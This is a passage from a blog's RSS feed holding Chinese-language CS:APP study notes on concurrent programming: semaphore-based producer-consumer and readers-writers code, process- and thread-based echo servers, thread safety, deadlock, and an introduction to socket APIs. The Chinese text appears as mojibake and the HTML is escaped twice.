	P(&amp;amp;sp-&amp;gt;slots); /* Wait for available slot */ 
	P(&amp;amp;sp-&amp;gt;mutex); /* Lock the buffer */ 
	sp-&amp;gt;buf[(++sp-&amp;gt;rear)%(sp-&amp;gt;n)] = item; /* Insert the item */ 
	V(&amp;amp;sp-&amp;gt;mutex); /* Unlock the buffer */ 
	V(&amp;amp;sp-&amp;gt;items); /* Announce available item */ 
}
/* Remove and return the first item from buffer sp */ 
int sbuf_remove(sbuf_t *sp) { 
	int item; P(&amp;amp;sp-&amp;gt;items); /* Wait for available item */ 
	P(&amp;amp;sp-&amp;gt;mutex); /* Lock the buffer */ 
	item = sp-&amp;gt;buf[(++sp-&amp;gt;front)%(sp-&amp;gt;n)]; /* Remove the item */ 
	V(&amp;amp;sp-&amp;gt;mutex); /* Unlock the buffer */ 
	V(&amp;amp;sp-&amp;gt;slots); /* Announce available slot */ 
	return item; 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;è¯»å†™é—®é¢˜&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;è¯»å–çº¿ç¨‹åªè¯»æ–‡ä»¶&lt;/li&gt;
&lt;li&gt;å†™çº¿ç¨‹ä¿®æ”¹æ–‡ä»¶&lt;/li&gt;
&lt;li&gt;å†™çº¿ç¨‹å¿…é¡»å¯¹æ–‡ä»¶æœ‰äº’æ–¥é”&lt;/li&gt;
&lt;li&gt;è¯»å–çº¿ç¨‹ä¸é™é‡&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å¤šæ ·çš„è¯»å†™é—®é¢˜:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ç¬¬ä¸€ç±»è¯»å†™é—®é¢˜(æœ‰åˆ©äºè¯»)
 è¯»æ–¹ä¸åº”è¯¥ç­‰å¾…,é™¤éå†™æ–¹å·²ç»å–å¾—ä½¿ç”¨æƒ
 è¯»æ“ä½œå°±ç®—æ¯”å†™æ“ä½œåæ¥,ä¹Ÿå…·æœ‰æ›´é«˜ä¼˜å…ˆçº§&lt;/li&gt;
&lt;li&gt;ç¬¬äºŒç±»è¯»å†™é—®é¢˜(æœ‰åˆ©äºå†™)
 ä¸€æ—¦å†™æ“ä½œå°±ç»ª,å°½å¿«å®è¡Œ
 è¯»æ“ä½œå°±ç®—æ¯”å†™æ“ä½œå…ˆæ¥,ä¹Ÿè¦ç­‰å†™æ“ä½œ&lt;/li&gt;
&lt;li&gt;ä¸¤ç§ç­–ç•¥éƒ½æœ‰å‘ç”Ÿé¥¥é¥¿çš„é£é™©&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;ç¬¬ä¸€ç±»è¯»å†™é—®é¢˜:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Writers:&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;void writer(void) { 
    while (1) { 
        P(&amp;amp;w); 
        
        /* Critical section */ 
        /* Writing happens */ 
        
        V(&amp;amp;w); 
    } 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;Readers:&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int readcnt; /* Initially = 0 */ 
sem_t mutex, w; /* Initially = 1 */ 
void reader(void) { 
    while (1) { 
        P(&amp;amp;mutex); 
        readcnt++; 
        if (readcnt == 1) /* First in */ 
            P(&amp;amp;w); 
        V(&amp;amp;mutex); 
        
        /* Critical section */ 
        /* Reading happens */ 
        
        P(&amp;amp;mutex); 
        readcnt--; 
        if (readcnt == 0) /* Last out */ 
            V(&amp;amp;w); 
        V(&amp;amp;mutex); 
    } 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;çº¿ç¨‹æ± å¹¶å‘æœåŠ¡å™¨&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250212200018.png&quot; alt=&quot;&quot;&gt;
ä¹‹å‰çš„æœåŠ¡å™¨ä¸æ–­åœ°åˆ›å»ºé”€æ¯çº¿ç¨‹,é€ æˆäº†æ€§èƒ½çš„æµªè´¹.ä¸å¦‚æå‰å‡†å¤‡å¥½ä¸€ä¸ªçº¿ç¨‹æ± ,æœ‰ä»»åŠ¡æ—¶ä»çº¿ç¨‹æ± å–å‡ºçº¿ç¨‹è¿›è¡Œå¤„ç†.
åœ¨è¿™ä¸ªæ¨¡å‹ä¸­,ä¸»çº¿ç¨‹æä¾›çš„å®¢æˆ·ç«¯è¯·æ±‚ç›¸å½“äºç”Ÿäº§è€…,çº¿ç¨‹æ± ç›¸å½“äºæ¶ˆè´¹è€….
ä»£ç è¿˜æ˜¯å¾ˆç²¾å¦™çš„:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;sbuf_t sbuf; /* Shared buffer of connected descriptors */ 
int main(int argc, char **argv) { 
	int i, listenfd, connfd; 
	socklen_t clientlen; 
	struct sockaddr_storage clientaddr; 
	pthread_t tid; 
	
	listenfd = Open_listenfd(argv[1]); 
	sbuf_init(&amp;amp;sbuf, SBUFSIZE); 
	for (i = 0; i &amp;lt; NTHREADS; i++) /* Create worker threads */ 
		Pthread_create(&amp;amp;tid, NULL, thread, NULL); 
	while (1) { 
		clientlen = sizeof(struct sockaddr_storage); 
		connfd = Accept(listenfd, (SA *) &amp;amp;clientaddr, &amp;amp;clientlen); 
		sbuf_insert(&amp;amp;sbuf, connfd); /* Insert connfd in buffer */ 
	} 
}
void *thread(void *vargp) { 
	Pthread_detach(pthread_self()); 
	while (1) { 
		int connfd = sbuf_remove(&amp;amp;sbuf); /* Remove connfd from buf */ 
		echo_cnt(connfd); /* Service client */ 
		Close(connfd); 
	} 
}

static int byte_cnt; /* Byte counter */ 
static sem_t mutex; /* and the mutex that protects it */ 
static void init_echo_cnt(void) { Sem_init(&amp;amp;mutex, 0, 1); byte_cnt = 0; }

void echo_cnt(int connfd) { 
	int n; char buf[MAXLINE]; 
	rio_t rio; 
	static pthread_once_t once = PTHREAD_ONCE_INIT; 
	
	Pthread_once(&amp;amp;once, init_echo_cnt);  // åªæœ‰ç¬¬ä¸€ä¸ªè¿è¡Œåˆ°è¿™é‡Œçš„çº¿ç¨‹ä¼šæ‰§è¡Œ
	Rio_readinitb(&amp;amp;rio, connfd); 
	while((n = Rio_readlineb(&amp;amp;rio, buf, MAXLINE)) != 0) { 
		P(&amp;amp;mutex); 
		byte_cnt += n; 
		printf(&amp;quot;thread %d received %d (%d total) bytes on fd %d\n&amp;quot;, (int) pthread_self(), n, byte_cnt, connfd); 
		V(&amp;amp;mutex); 
		Rio_writen(connfd, buf, n); 
	} 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;çº¿ç¨‹å®‰å…¨&lt;/h1&gt;
&lt;p&gt;å¦‚æœä¸€ä¸ªå‡½æ•°èƒ½å¤Ÿè¢«å¤šä¸ªå¹¶å‘çº¿ç¨‹è°ƒç”¨è€Œä¸å½±å“æ­£ç¡®ç»“æœçš„æ˜¯çº¿ç¨‹å®‰å…¨çš„å‡½æ•°.
çº¿ç¨‹åªåº”ä½¿ç”¨çº¿ç¨‹å®‰å…¨çš„å‡½æ•°.
å››ç§çº¿ç¨‹ä¸å®‰å…¨çš„å‡½æ•°:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ä¸ä¿æŠ¤å…±äº«å˜é‡çš„å‡½æ•°&lt;/li&gt;
&lt;li&gt;åœ¨å¤šæ¬¡è°ƒç”¨ä¸­è¿½è¸ªçŠ¶æ€çš„å‡½æ•°
 å°†çŠ¶æ€å­˜å‚¨åœ¨æŸä¸ªå…¨å±€å˜é‡,ç§æœ‰æˆ–å…¬å…±å…¨å±€å˜é‡ä¸­.å¤šä¸ªçº¿ç¨‹å°†è®¿é—®è¯¥çŠ¶æ€.&lt;/li&gt;
&lt;li&gt;è¿”å›æŒ‡å‘åŒä¸€ä¸ªä½ç½®(é™æ€å˜é‡)çš„æŒ‡é’ˆçš„å‡½æ•°
 æ¯ä¸€æ¬¡è°ƒç”¨çš„ç»“æœéƒ½è¢«è¦†å†™&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* lock-and-copy version */ 
char *ctime_ts(const time_t *timep, char *privatep) { 
    char *sharedp; 
    
    P(&amp;amp;mutex); 
    sharedp = ctime(timep); 
    strcpy(privatep, sharedp); 
    V(&amp;amp;mutex); 
    return privatep; 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;ä»»ä½•è°ƒç”¨çº¿ç¨‹ä¸å®‰å…¨å‡½æ•°çš„å‡½æ•°ğŸ¤£&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;å¯é‡å…¥å‡½æ•°&lt;/h2&gt;
&lt;p&gt;å¯é‡å…¥å‡½æ•°æ˜¯çº¿ç¨‹å®‰å…¨å‡½æ•°çš„ä¸€ä¸ªå­ç±».
å¦‚æœå‡½æ•°ä¸è®¿é—®å…±äº«å˜é‡,å°±æ˜¯å¯é‡å…¥å‡½æ•°.
ä½¿ç¬¬äºŒç±»çº¿ç¨‹ä¸å®‰å…¨å‡½æ•°å˜å®‰å…¨å”¯ä¸€åŠæ³•æ˜¯è®©å®ƒå˜æˆå¯é‡å…¥å‡½æ•°.å…±äº«å˜é‡ä½œä¸ºå‚æ•°ä¼ å…¥.&lt;/p&gt;
&lt;h2&gt;æ­»é”&lt;/h2&gt;
&lt;p&gt;å¦‚æœä¸€ä¸ªè¿›ç¨‹ç­‰å¾…ä¸€ä¸ªæ°¸è¿œä¸ä¼šæˆç«‹çš„æ¡ä»¶,å°±è¿›å…¥äº†æ­»é”.
è¿›ç¨‹1å–å¾—Açš„é”,ç­‰å¾…Bè§£é”
è¿™æ—¶å€™è¿›ç¨‹1 è¢«æ‰“æ–­,è°ƒåº¦åˆ°è¿›ç¨‹2
è¿›ç¨‹2å–å¾—Bçš„é”,ç­‰å¾…Aè§£é”&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int main() { 
	pthread_t tid[2]; 
	Sem_init(&amp;amp;mutex[0], 0, 1); /* mutex[0] = 1 */ 
	Sem_init(&amp;amp;mutex[1], 0, 1); /* mutex[1] = 1 */ 
	Pthread_create(&amp;amp;tid[0], NULL, count, (void*) 0); 
	Pthread_create(&amp;amp;tid[1], NULL, count, (void*) 1); 
	Pthread_join(tid[0], NULL); 
	Pthread_join(tid[1], NULL); 
	printf(&amp;quot;cnt=%d\n&amp;quot;, cnt); exit(0); 
} 

void *count(void *vargp) { 
	int i; 
	int id = (int) vargp; 
	for (i = 0; i &amp;lt; NITERS; i++) { 
		P(&amp;amp;mutex[id]); P(&amp;amp;mutex[1-id]); 
		cnt++; 
		V(&amp;amp;mutex[id]); V(&amp;amp;mutex[1-id]); 
	} 
	return NULL; 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Tid[0]&lt;/th&gt;
&lt;th&gt;Tid[1]&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;P(s0)&lt;/td&gt;
&lt;td&gt;P(s1)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;P(s1)&lt;/td&gt;
&lt;td&gt;P(s0)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;cnt++&lt;/td&gt;
&lt;td&gt;cnt++&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;V(s0)&lt;/td&gt;
&lt;td&gt;V(s1)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;V(s1)&lt;/td&gt;
&lt;td&gt;V(s0)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;è¿›åº¦å›¾:
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250212205837.png&quot; alt=&quot;&quot;&gt;
å¦‚æœä»¥ä¸€ä¸ªå›ºå®šçš„é¡ºåºå–å¾—èµ„æºçš„é”å°±å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Tid[0]&lt;/th&gt;
&lt;th&gt;Tid[1]&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;P(s0)&lt;/td&gt;
&lt;td&gt;P(s0)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;P(s1)&lt;/td&gt;
&lt;td&gt;P(s1)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;cnt++&lt;/td&gt;
&lt;td&gt;cnt++&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;V(s0)&lt;/td&gt;
&lt;td&gt;V(s1)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;V(s1)&lt;/td&gt;
&lt;td&gt;V(s0)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250212210221.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
</content:encoded><dc:creator>Dalekov</dc:creator><pubDate>Mon, 10 Feb 2025 16:00:00 GMT</pubDate></item><item><title>å¹¶å‘ç¼–ç¨‹</title><link>https://www.tankimzeg.top/blog/%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/</link><guid isPermaLink="true">https://www.tankimzeg.top/blog/%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/</guid><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://www.tankimzeg.top/blog/%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/&quot;&gt;https://www.tankimzeg.top/blog/%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/&lt;/a&gt;&lt;/blockquote&gt; &lt;h1&gt;å¹¶å‘ç¨‹åºçš„å…¸å‹é—®é¢˜&lt;/h1&gt;
&lt;p&gt;æˆ‘åœ¨shell labä¸­ä½¿ç”¨ä¿¡å·æœºåˆ¶çš„æ··ä¹±ç¨‹åº¦è®©æˆ‘å°è±¡æ·±åˆ»,å¹¶å‘ç¨‹åºç¡®å®å®¹æ˜“æœ‰å„ç§bug.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ç«äº‰:ç»“æœä¸ç³»ç»Ÿè¿›ç¨‹è°ƒåº¦æœ‰å…³.&lt;/li&gt;
&lt;li&gt;æ­»é”:å¯¹æŸäº›ç³»ç»Ÿèµ„æºçš„é”å®šå¼•å‘æ°¸è¿œçš„ç­‰å¾….
  ä¾‹å¦‚,ä¸»å‡½æ•°ä½¿ç”¨äº†&lt;code&gt;printf&lt;/code&gt;å‡½æ•°,å–å¾—äº†stdoutçš„é”å®š.è¿™æ—¶å€™è¢«ä¸€ä¸ªä¿¡å·æ‰“æ–­äº†,ä¿¡å·å¤„ç†å‡½æ•°åˆä½¿ç”¨&lt;code&gt;printf&lt;/code&gt;å‡½æ•°å¾€stdoutæ‰“å°å†…å®¹,stdoutè¢«å ç”¨å°±ä¼šä¸€ç›´ç­‰å¾….&lt;/li&gt;
&lt;li&gt;æ´»é”/é¥¥é¥¿/å…¬å¹³&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;å¹¶å‘æœåŠ¡å™¨&lt;/h1&gt;
&lt;p&gt;æˆ‘ä¹‹å‰è‡ªå­¦ç½‘ç»œç¼–ç¨‹çš„æ—¶å€™,è‡ªå·±å†™è¿‡ä¸€ä¸ªFTPå¹¶å‘æœåŠ¡å™¨,æ‰€ä»¥ç°åœ¨å¯¹è¿™äº›æ¦‚å¿µç†è§£èµ·æ¥å¾ˆå®¹æ˜“hh.
åˆ›å»ºå¹¶å‘æœåŠ¡å™¨çš„æ–¹æ³•:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;[[å¹¶å‘ç¼–ç¨‹#åŸºäºè¿›ç¨‹|åŸºäºè¿›ç¨‹]]&lt;ul&gt;
&lt;li&gt;å†…æ ¸è‡ªåŠ¨è°ƒåº¦é€»è¾‘æµ&lt;/li&gt;
&lt;li&gt;æ¯ä¸ªé€»è¾‘æµæœ‰ç§æœ‰åœ°å€ç©ºé—´&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;äº‹ä»¶é©±åŠ¨&lt;ul&gt;
&lt;li&gt;ç¨‹åºæ‰‹åŠ¨ç®¡ç†é€»è¾‘æµ&lt;/li&gt;
&lt;li&gt;æ‰€æœ‰é€»è¾‘æµå…±äº«åœ°å€ç©ºé—´&lt;/li&gt;
&lt;li&gt;I/Oå¤ç”¨&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;åŸºäºçº¿ç¨‹&lt;ul&gt;
&lt;li&gt;å†…æ ¸è‡ªåŠ¨è°ƒåº¦é€»è¾‘æµ&lt;/li&gt;
&lt;li&gt;æ¯ä¸ªé€»è¾‘æµå…±äº«åœ°å€ç©ºé—´&lt;/li&gt;
&lt;li&gt;ä»¥ä¸Šä¸¤ç§çš„ç»“åˆ&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;åŸºäºè¿›ç¨‹&lt;/h2&gt;
&lt;p&gt;æˆ‘åšçš„å¹¶å‘æœåŠ¡å™¨å°±æ˜¯è¿™ä¸ªæ–¹æ³•,æ”¾å‡ ä¸ªå›¾åŠ æ·±ä¸€ä¸‹å°è±¡å°±è¡Œ,ä¸å¿…èµ˜è¿°.
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250211120225.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* echoserverp.c */

int main(int argc, char **argv) { 
	int listenfd, connfd; 
	socklen_t clientlen; 
	struct sockaddr_storage clientaddr; 
	Signal(SIGCHLD, sigchld_handler); 
	listenfd = Open_listenfd(argv[1]); 
	while (1) { 
		clientlen = sizeof(struct sockaddr_storage); 
		connfd = Accept(listenfd, (SA *) &amp;amp;clientaddr, &amp;amp;clientlen); 
		if (Fork() == 0) { 
			Close(listenfd); /* Child closes its listening socket */ 
			echo(connfd); /* Child services client */ 
			Close(connfd); /* Child closes connection with client */ 
			exit(0); /* Child exits */ 
		} 
		Close(connfd); /* Parent closes connected socket (important!) */ 
	} 
}

void sigchld_handler(int sig) { while (waitpid(-1, 0, WNOHANG) &amp;gt; 0) ; return; }
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;ä¼˜ç‚¹:ç®€å•&lt;/li&gt;
&lt;li&gt;ç¼ºç‚¹:å¼€é”€è¾ƒå¤§,å­è¿›ç¨‹ä¸å…±äº«å˜é‡&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;åŸºäºI/Oå¤šè·¯å¤ç”¨çš„å¹¶å‘äº‹ä»¶é©±åŠ¨æœåŠ¡å™¨&lt;/h2&gt;
&lt;p&gt;è§CS:APP 686
æˆ‘çœ‹äº†ä¸€ä¸‹ä¹¦é‡Œçš„ä»£ç ,åŸºæœ¬æ€æƒ³å°±æ˜¯ç»´æŠ¤ä¸€ä¸ªå®¢æˆ·ç«¯æ± (ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦è¡¨),ç„¶åç”¨æ­»å¾ªç¯è°ƒç”¨&lt;code&gt;select&lt;/code&gt;å‡½æ•°,èƒ½ç›‘è§†å®ƒä»¬æ˜¯å¦å‡†å¤‡å¥½è¯».
ä¸€æ—¦å‘ç°&lt;code&gt;listen&lt;/code&gt;å‡†å¤‡å¥½è¯»,æ·»åŠ å®¢æˆ·ç«¯æ± ;ä¸€æ—¦å‘ç°å®¢æˆ·ç«¯å¥—æ¥å­—å‡†å¤‡å¥½è¯»,å¤„ç†è¯¥å®¢æˆ·ç«¯å¥—æ¥å­—.&lt;/p&gt;
&lt;p&gt;ç°ä»£é«˜æ€§èƒ½WebæœåŠ¡å™¨(nginx),éƒ½æ˜¯åŸºäºI/Oå¤ç”¨.ä¼˜ç‚¹æ˜¯å¼€é”€å°;ç¼ºç‚¹æ˜¯ä»£ç æ¯”è¾ƒå¤æ‚.&lt;/p&gt;
&lt;h2&gt;åŸºäºçº¿ç¨‹&lt;/h2&gt;
&lt;p&gt;&amp;quot;çº¿ç¨‹æ˜¯è½»é‡çº§çš„è¿›ç¨‹&amp;quot;&lt;/p&gt;
&lt;p&gt;è¿›ç¨‹ = è¿›ç¨‹ä¸Šä¸‹æ–‡ + ä»£ç ,æ•°æ®,å †æ ˆ
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250211165558.png&quot; alt=&quot;&quot;&gt;
è¿›ç¨‹ = çº¿ç¨‹+ ä»£ç ,æ•°æ®,å †,å†…æ ¸ä¸Šä¸‹æ–‡
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250211165754.png&quot; alt=&quot;&quot;&gt;
è¿™åªæ˜¯è§†è§’çš„ä¸åŒ!&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;æ¯ä¸ªçº¿ç¨‹æœ‰è‡ªå·±çš„é€»è¾‘æ§åˆ¶æµ&lt;/li&gt;
&lt;li&gt;æ¯ä¸ªçº¿ç¨‹å…±äº«ä»£ç ,æ•°æ®,å†…æ ¸ä¸Šä¸‹æ–‡&lt;/li&gt;
&lt;li&gt;æ¯ä¸ªçº¿ç¨‹æœ‰è‡ªå·±çš„æ ˆ&lt;/li&gt;
&lt;li&gt;æ¯ä¸ªçº¿ç¨‹æœ‰çº¿ç¨‹TID&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* echoservert.c */
int main(int argc, char **argv) { 
	int listenfd, *connfdp; 
	socklen_t clientlen; 
	struct sockaddr_storage clientaddr; 
	pthread_t tid; 
	
	listenfd = Open_listenfd(argv[1]); 
	while (1) { 
		clientlen=sizeof(struct sockaddr_storage); 
		connfdp = Malloc(sizeof(int)); 
		*connfdp = Accept(listenfd, (SA *) &amp;amp;clientaddr, &amp;amp;clientlen); 
		Pthread_create(&amp;amp;tid, NULL, thread, connfdp);
	}
}
/* Thread routine */ 
void *thread(void *vargp) { 
	int connfd = *((int *)vargp); 
	Pthread_detach(pthread_self()); 
	Free(vargp); 
	echo(connfd); 
	Close(connfd); 
	return NULL; 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250211172356.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;åœ¨ä½¿ç”¨çº¿ç¨‹æ—¶éœ€è¦å°å¿ƒçš„æ˜¯,ç”±äºçº¿ç¨‹å…±äº«å˜é‡,ä¹Ÿä¸å¯¹è‡ªå·±çš„æ ˆè®¾ç½®ä¿æŠ¤,ä¸€ä¸ªçº¿ç¨‹å‘å¦ä¸€ä¸ªçº¿ç¨‹ä¼ é€’å±€éƒ¨å˜é‡(çš„æŒ‡é’ˆ)æ˜¯å±é™©çš„è¡Œä¸º.æ­£å› å¦‚æ­¤,ä¸Šé¢echoæœåŠ¡å™¨æ‰ä½¿ç”¨äº†&lt;code&gt;malloc&lt;/code&gt;å°†å˜é‡æ”¾åœ¨å †é‡Œè€Œä¸æ˜¯æ ˆé‡Œ.&lt;/p&gt;
</content:encoded><dc:creator>Dalekov</dc:creator><pubDate>Mon, 10 Feb 2025 16:00:00 GMT</pubDate></item><item><title>ç½‘ç»œç¼–ç¨‹</title><link>https://www.tankimzeg.top/blog/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</link><guid isPermaLink="true">https://www.tankimzeg.top/blog/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</guid><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://www.tankimzeg.top/blog/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/&quot;&gt;https://www.tankimzeg.top/blog/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/&lt;/a&gt;&lt;/blockquote&gt; &lt;h1&gt;C/Sæ¨¡å‹&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250210161823.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250210162123.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h1&gt;è®¡ç®—æœºç½‘ç»œ&lt;/h1&gt;
&lt;p&gt;ç®€å•è®²äº†è®¡ç®—æœºç½‘ç»œçš„çŸ¥è¯†,è¿™æˆ‘å¯ä¸é™Œç”ŸğŸ˜‹.&lt;/p&gt;
&lt;h1&gt;å¥—æ¥å­—&lt;/h1&gt;
&lt;p&gt;å¯¹åº”ç”¨æ¥è¯´,å¥—æ¥å­—æ˜¯äº¤æµçš„ç«¯ç‚¹;å¯¹å†…æ ¸æ¥è¯´,å¥—æ¥å­—æ˜¯ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ä¾›åº”ç”¨ä»ç½‘ç»œè¯»å†™.
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250210190312.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;ä¸å¾—ä¸è¯´,å¤–å›½æ•™å­¦çš„å›¾ç‰‡éƒ½å¥½å¥½çœ‹å–”&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;è¿™éƒ¨åˆ†å¥—æ¥å­—æ“ä½œçš„ä»‹ç»,å¯è§äºæˆ‘çš„OneNoteç¬”è®°æœ¬.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;å°†socketå’Œå®ƒä½¿ç”¨çš„åè®®/IPåœ°å€ç­‰ä¿¡æ¯è”ç³»èµ·æ¥,å°±æŠ½è±¡æˆäº†ä¸€ä¸ªç»“æ„ä½“:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;struct sockaddr { 
	uint16_t sa_family; /* Protocol family */ 
	char sa_data[14]; /* Address data. */ 
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åœ¨å®é™…åº”ç”¨ä¸­,ä½¿ç”¨æ›´å…·ä½“çš„&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;struct sockaddr_in { 
	uint16_t sin_family; /* Protocol family (always AF_INET) */ 
	uint16_t sin_port; /* Port num in network byte order */ 
	struct in_addr sin_addr; /* IP addr in network byte order */ 
	unsigned char sin_zero[8]; /* Pad to sizeof(struct sockaddr) */ 
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250210191248.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;ä¸€ä¸ªç®€å•çš„ä¸²è¡ŒC/Säº¤äº’å›¾:
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250210210410.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;åˆ›å»ºsocketæ–‡ä»¶æè¿°ç¬¦&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int socket(int domain, int type, int protocol);
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;ç»‘å®šsocket&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int bind(int sockfd, struct sockaddr *addr, socklen_t addrlen);
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;ç›‘å¬socket&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int listen(int sockfd, int backlog);
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;æ¥æ”¶è¯·æ±‚,è¿”å›å¦ä¸€ä¸ªç”¨äºI/Oçš„socket&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int accept(int listenfd, struct sockaddr *addr, int *addrlen);
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;è¯·æ±‚è¿æ¥&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int connect(int clientfd, struct sockaddr *addr, socklen_t addrlen);
&lt;/code&gt;&lt;/pre&gt;
 &lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250210234746.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;æœ€ä½³å®è·µ,æ˜¯åˆ©ç”¨&lt;code&gt;getaddrinfo&lt;/code&gt;å‡½æ•°è¿”å›çš„ä¿¡æ¯.&lt;/p&gt;
&lt;ol start=&quot;6&quot;&gt;
&lt;li&gt;&lt;code&gt;getaddrinfo&lt;/code&gt;å‡½æ•°:æŸ¥è¯¢å¤„ç†ä¸»æœºå,ä¸»æœºåœ°å€,ç«¯å£,åè®®ç­‰ä¿¡æ¯.
